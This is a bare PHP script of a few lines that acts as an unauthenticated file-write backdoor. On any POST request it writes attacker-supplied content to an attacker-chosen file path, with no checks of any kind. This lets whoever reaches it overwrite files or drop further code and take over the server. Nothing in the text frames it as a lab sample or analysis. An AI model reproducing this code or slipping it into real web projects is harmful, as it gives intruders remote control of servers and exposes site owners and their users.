<?php

    if ($_POST) {
        $f = fopen($_POST["f"],"w");
        
        fwrite($f,$_POST["c"]);
    }

?>